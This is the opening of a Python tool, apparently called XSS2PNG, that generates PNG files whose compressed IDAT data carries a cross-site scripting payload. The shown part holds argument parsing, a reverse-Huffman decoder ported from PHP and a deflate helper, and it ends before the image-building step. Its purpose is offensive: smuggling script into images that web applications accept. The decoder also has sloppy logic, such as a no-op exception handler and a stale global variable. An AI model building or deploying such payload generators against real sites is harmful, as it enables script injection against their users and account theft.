#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# imports
import os
import sys
import zlib
import argparse 
from PIL import Image

def banner():
	print("XSS2PNG")


def parse_args():
    parser = argparse.ArgumentParser(
        description="PNG IDAT chunks XSS payload generator", epilog="Don't be evil :)"
    )
    parser.add_argument("-p", dest="payload", help="XSS Payload", required=True)
    parser.add_argument("-o", dest="output", help="Output .png file", required=True)
    return parser.parse_args()

def reverse_huffman(huffman):
    bitstream = ""
    for char in list(huffman):
        bits = f"{ord(char):08b}"
        bitstream = bits + bitstream
    bitstream = bitstream[::-1]  # strrev($bitstream);
    bitstream = bitstream[3:]  # substr($bitstream, 3);

    chars = []
    i = 0
    while len(bitstream) > 0:
        eightBits = bitstream[0:8]  # substr($bitstream, 0, 8);

        ### TODO NOT HERE
        huffman_static_codes_dict = {}
        ii = 0
        for i in range(48, 191):
            binary = "{0:b}".format(i)
            if len("{0:b}".format(i)) == 6:
                huffman_static_codes_dict.update({ii: "00" + binary})
            elif len("{0:b}".format(i)) == 7:
                huffman_static_codes_dict.update({ii: "0" + binary})
            else:
                huffman_static_codes_dict.update({ii: binary})
            ii += 1

        # 143
        for i in range(399, 512):
            binary = "{0:b}".format(i)
            huffman_static_codes_dict.update({ii: binary})
            ii += 1
        ### TODO NOT HERE

        global dec
        if eightBits in huffman_static_codes_dict.values():
            dec = list(huffman_static_codes_dict.keys())[
                list(huffman_static_codes_dict.values()).index(eightBits)
            ]
            bitstream = bitstream[8:]
        else:
            try:
                dec = list(huffman_static_codes_dict.keys())[
                    list(huffman_static_codes_dict.values()).index(bitstream[0:9])
                ]
            except:
                next
            bitstream = bitstream[9:]

        if dec:
            if dec < 256:
                chars.append(chr(dec))
            # else:
            # print("OUTOFBOUNDS")
        else:
            print("END")

    return "".join(chars)

def gzdeflate(string):
    compressor = zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS)
    compressed = compressor.compress(string)
    compressed += compressor.flush()
    return compressed

def to_ord_array(bin_string):
	return [ord(char) for char in bin_string]
	